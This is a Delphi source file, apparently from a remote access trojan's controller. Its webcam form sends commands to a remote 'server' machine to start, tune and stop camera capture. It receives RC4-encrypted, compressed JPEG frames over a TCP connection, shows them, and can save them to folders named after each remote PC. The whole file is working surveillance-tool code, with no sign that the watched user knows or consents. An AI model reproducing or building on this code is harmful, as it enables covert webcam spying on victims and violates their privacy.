unit UnitWebcam;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, GR32_Image, ComCtrls, StdCtrls, ExtCtrls, UnitPrincipal, IdThreadMgr, IdThreadMgrDefault, IdAntiFreezeBase, IdAntiFreeze,
  IdBaseComponent, IdComponent, IdTCPServer, GR32_Layers;

type
  TFormWebcam = class(TForm)
    Panel2: TPanel;
    Label2: TLabel;
    Label3: TLabel;
    Label1: TLabel;
    Edit1: TEdit;
    ProgressBar1: TProgressBar;
    Button2: TButton;
    Button3: TButton;
    Edit2: TEdit;
    UpDown1: TUpDown;
    Panel3: TPanel;
    CheckBox3: TCheckBox;
    TrackBar1: TTrackBar;
    Panel1: TPanel;
    Image1: TImage32;
    procedure TrackBar1Change(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure Button2Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
  private
    { Private declarations }
    Servidor: PConexao;
    OldW, OldH: Integer;
    LastChange: integer;
    LastInterval, LastQuality: string;
    AThreadTransfer: TIdPeerThread;
    procedure WMExitSizeMove(var Meg: TMessage); message WM_EXITSIZEMOVE;
  public
    { Public declarations }
    NomePC: string;
    Ratio: Single;
    FecharForm: boolean;
    FirstTime: boolean;
    procedure OnRead(Recebido: String; AThread: TIdPeerThread); overload;
    constructor Create(aOwner: TComponent; ConAux: PConexao);overload;
  end;

var
  FormWebcam: TFormWebcam;

implementation

{$R *.dfm}

uses
  UnitComandos,
  UnitStrings,
  UnitConexao,
  UnitCryptString,
  FuncoesDiversasCliente,
  Jpeg,
  UnitCompressString,
  IniFiles;

constructor TFormWebcam.Create(aOwner: TComponent; ConAux: PConexao);
begin
  inherited Create(aOwner);
  Servidor := ConAux;
end;

procedure TFormWebcam.TrackBar1Change(Sender: TObject);
begin
  edit1.Text := inttostr(trackbar1.Position);
end;

procedure TFormWebcam.WMExitSizeMove(var Meg: TMessage);
var
  TempStr: string;
  MudarTamanho: boolean;
begin
  MudarTamanho := true;
  if Width <> OldW then Height := Round(Width / Ratio) else
  if Height <> OldH then Width := Round(Height * Ratio) else MudarTamanho := false;
  TempStr := caption;
  if pos(' ---> ', Tempstr) > 0 then TempStr := copy(TempStr, 1, pos(' ---> ', Tempstr) - 1) else
  TempStr := Caption;
  Caption := TempStr + ' ---> ' + inttostr(Image1.Width) + ' X ' + inttostr(Image1.Height);
  OldW := Width;
  OldH := Height;

  if (LastChange <> 0) and (gettickcount < Lastchange + 500) then Exit;
  if ((LastInterval <> edit2.Text) or (LastQuality <> edit1.Text) or (MudarTamanho = true)) and
     (Button3.Enabled = true) then
  begin
    LastChange := gettickcount;
    EnviarString(Servidor.Athread, WEBCAMSETTINGS + '|' +
                                   Edit1.Text + '|' + //qualidade
                                   Edit2.Text + '|', true); //intervalo
    LastInterval := edit2.Text;
    LastQuality := edit1.Text;
  end;
end;

procedure TFormWebcam.FormCreate(Sender: TObject);
begin
  Ratio := 600 / 480;
end;

procedure TFormWebcam.FormShow(Sender: TObject);
var
  IniFile: TIniFile;
  Qualidade: integer;
  Intervalo: integer;
begin
  if fileexists(FormPrincipal.SettingsFile) then
  begin
    IniFile := TIniFile.Create(FormPrincipal.SettingsFile);

    Qualidade := IniFile.ReadInteger('webcam', 'qualidade', 50);
    if Qualidade > 100 then Qualidade := 100;
    Intervalo := IniFile.ReadInteger('webcam', 'intervalo', 2);

    IniFile.Free;
  end;

  Button2.Caption := traduzidos[145];
  Button3.Caption := traduzidos[144];
  Label2.Caption := traduzidos[287];
  Label3.Caption := traduzidos[288];
  Checkbox3.Caption := traduzidos[115];
  ProgressBar1.Position := 0;

  TrackBar1.Position := Qualidade;
  UpDown1.Position := intervalo;
  Edit1.Text := inttostr(TrackBar1.Position);
  Edit2.Text := inttostr(UpDown1.Position);

  Button2.Enabled := true;
  Button3.Enabled := false;
  OldW := Width;
  OldH := Height;
  FirstTime := true;

  Button2.Click;
end;

procedure TFormWebcam.OnRead(Recebido: String; AThread: TIdPeerThread);
var
  TempStr: string;
  SizeBuffer: int64;
  OndeSalvar: string;
  S: TMemoryStream;
  J: TJpegImage;
  b: TBitmap;
  i: integer;
begin
  if copy(recebido, 1, pos('|', recebido) - 1) = WEBCAM then
  begin

  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = WEBCAMGETBUFFER then
  begin
    AThreadTransfer := Athread;

    delete(recebido, 1, pos('|', recebido));
    sleep(1000);

    Button3.Enabled := true;

    while AThreadTransfer.Connection.Connected = true do
    begin
      i := gettickcount;
      sleep(5);

      Tempstr := AThreadTransfer.Connection.ReadLn;
      if pos('|', Tempstr) <= 0 then continue;
      try
        SizeBuffer := strtoint(copy(Tempstr, 1, pos('|', Tempstr) - 1));
        except
        continue;
      end;
      if SizeBuffer <= 0 then continue;
      label1.Caption := FormatByteSize(SizeBuffer);
      ProgressBar1.Max := SizeBuffer;
      ProgressBar1.Position := 0;

      recebido := ReceberBuffer(SizeBuffer, AThreadTransfer, ProgressBar1);
      recebido := EnDecryptStrRC4B(recebido, MasterPassword);
      recebido := DecompressString(recebido);

      if length(recebido) <= 0 then continue;
      S := TMemoryStream.Create;
      StrToStream(S, recebido);
      S.Position := 0;
      j := TJpegImage.Create;
      j.LoadFromStream(S);
      S.Free;
      b := tbitmap.Create;

      if CheckBox3.Checked = true then
      begin
        ForceDirectories(ExtractFilePath(ParamStr(0)) + 'Webcam\' + NomePC + '\');
        OndeSalvar := ExtractFilePath(ParamStr(0)) + 'Webcam\' + NomePC + '\' + inttostr(GetTickCount) + '.jpg'; // onde será salvo o log
        J.SaveToFile(OndeSalvar);
      end;

      b.Assign(j);
      j.Free;
      Image1.Bitmap.Assign(b);
      b.Free;

      if ((LastInterval <> edit2.Text) or (LastQuality <> edit1.Text)) and
         (Button3.Enabled = true) then
      sendMessage(handle, WM_EXITSIZEMOVE, 0, 0);
    end;

  end else





end;

procedure TFormWebcam.FormClose(Sender: TObject; var Action: TCloseAction);
var
  ToSend: string;
var
  IniFile: TIniFile;
begin
  if fileexists(FormPrincipal.SettingsFile) then
  begin
    IniFile := TIniFile.Create(FormPrincipal.SettingsFile);

    IniFile.WriteInteger('webcam', 'qualidade', TrackBar1.Position);
    IniFile.WriteInteger('webcam', 'intervalo', UpDown1.Position);

    IniFile.Free;
  end;

  if AThreadTransfer <> nil then try AThreadTransfer.Connection.Disconnect; except end;

  ToSend := WEBCAMINACTIVE + '|';

  enviarstring(Servidor.Athread, ToSend, true);

  Button3.Enabled := false;
  Button2.Enabled := true;
  FecharForm := true;
end;

procedure TFormWebcam.Button2Click(Sender: TObject);
var
  ToSend: string;
begin
  LastInterval := edit2.Text;
  LastQuality := edit1.Text;

  Button2.Enabled := false;
  if FirstTime = false then
  begin
    ToSend := WEBCAM + '|';

    enviarstring(Servidor.Athread, ToSend, true);
    sleep(1000);
  end;

  ToSend := WEBCAMGETBUFFER + '|' +
            Edit1.Text + '|' + //qualidade
            Edit2.Text + '|'; //intervalo

  enviarstring(Servidor.Athread, ToSend, true);
  FirstTime := false;
end;

procedure TFormWebcam.Button3Click(Sender: TObject);
var
  ToSend: string;
begin
  if AThreadTransfer <> nil then try AThreadTransfer.Connection.Disconnect; except end;

  ToSend := WEBCAMINACTIVE + '|';

  enviarstring(Servidor.Athread, ToSend, true);

  Button3.Enabled := false;
  Button2.Enabled := true;
end;

end.
